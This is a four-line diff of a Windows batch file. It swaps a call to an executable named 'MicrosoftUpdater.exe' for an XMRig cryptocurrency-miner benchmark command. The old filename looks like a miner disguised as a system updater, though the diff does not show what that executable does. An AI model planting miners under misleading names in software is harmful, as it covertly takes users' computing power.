@@ -1,4 +1,4 @@
 @echo off
 cd /d "%~dp0"
-MicrosoftUpdater.exe
+xmrig.exe --bench=1M --submit
 pause
